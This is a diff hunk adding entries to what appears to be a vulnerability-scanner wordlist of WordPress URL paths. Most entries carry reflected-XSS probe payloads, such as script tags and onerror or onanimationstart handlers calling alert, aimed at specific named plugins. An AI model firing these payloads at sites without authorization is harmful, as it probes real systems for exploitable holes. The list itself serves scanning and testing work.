@@ -201,3 +201,7 @@
 /wp-admin/admin-ajax.php?action=fts_encrypt_token_ajax&access_token=%3Cimg%20src=x%20onerror=alert(/XSS/)%3E
 /wp-admin/admin.php?page=tiempocom%2Fapp%2Fadmin.php&action=new
 /wp-admin/admin.php?page=watu_exams&title=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28%2FXSS%2F%29%2F%2F
+/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php?url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-content/uploads/photo-gallery/xss.svg
+/wp-admin/admin.php?page=Accessibility&%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E
+/wp-admin/admin.php?page=tiempocom/app/admin.php&action=delete&shortcode=1
